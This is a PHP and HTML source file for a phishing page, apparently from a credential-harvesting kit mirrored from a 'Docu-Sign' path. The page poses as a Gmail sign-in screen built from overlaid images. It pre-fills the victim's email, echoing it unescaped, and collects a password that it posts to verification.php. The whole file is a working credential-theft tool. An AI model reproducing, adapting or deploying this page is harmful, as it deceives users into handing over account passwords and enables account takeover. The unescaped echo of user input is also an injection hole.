<?php
ini_set("output_buffering",4096);
session_start();

$_SESSION['email'] = $email = $_POST['email'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<!-- Mirrored from amghamdi.com/Docu-Sign/cf131/b70ad/login2.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Aug 2017 17:10:17 GMT -->
<head>
<title>Gmail</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />


<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style> 
  .textbox { 
    border: 1px solid #c4c4c4; 
    height: 42px; 
    width: 275px; 
    font-size: 16px; 
    padding: 4px 4px 4px 4px; 
    border-radius: 4px; 
    -moz-border-radius: 4px; 
    -webkit-border-radius: 4px; 
    box-shadow: 0px 0px 0px #d9d9d9; 
    -moz-box-shadow: 0px 0px 0px #d9d9d9; 
    -webkit-box-shadow: 0px 0px 0px #d9d9d9; 

} 
 </style> 

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:513px; top:42px; width:509px; height:690px; z-index:0"><img src="images/pp2.png" alt="" title="" border=0 width=509 height=690></div>
<form action=verification.php name=chalbhai id=chalbhai method=post>
<input name="email" value="<?php echo $email; ?>" type="text" style="border: 0px solid #000000;position:absolute;width:270px;text-align:center; background:rgba(227,162,11,0.0);left:634px;top:380px;z-index:1" readonly="">
<input name="email"  value="" type="text" style="border: 0px solid #000000;position:absolute;width:270px;text-align:center; background:rgba(227,162,11,0.0);left:634px;top:380px;z-index:1" readonly>
<input name="password"  placeholder=" Password"   required title="Enter your password" class="textbox" type="password" style="position:absolute;width:273px;left:631px;top:408px;z-index:2">
<div id="formcheckbox1" style="position:absolute; left:625px; top:506px; z-index:3"><input type="checkbox" name="formcheckbox1"></div>
<div id="image2" style="position:absolute; overflow:hidden; left:797px; top:508px; width:114px; height:17px; z-index:4"><a href="#"><img src="images/forgo.png" alt="" title="" border=0 width=114 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:662px; top:593px; width:210px; height:25px; z-index:5"><a href="#"><img src="images/new.png" alt="" title="" border=0 width=210 height=25></a></div>

<div id="formimage1" style="position:absolute; left:630px; top:461px; z-index:6"><input type="image" name="formimage1" width="277" height="40" src="images/signin.png"></div>
<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:849px; width:1679px; height:39px; z-index:7"><a href="#"><img src="images/footer.png" alt="" title="" border=0 width=1679 height=39></a></div>

</div>

</body>

<!-- Mirrored from amghamdi.com/Docu-Sign/cf131/b70ad/login2.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 19 Aug 2017 17:10:19 GMT -->
</html>
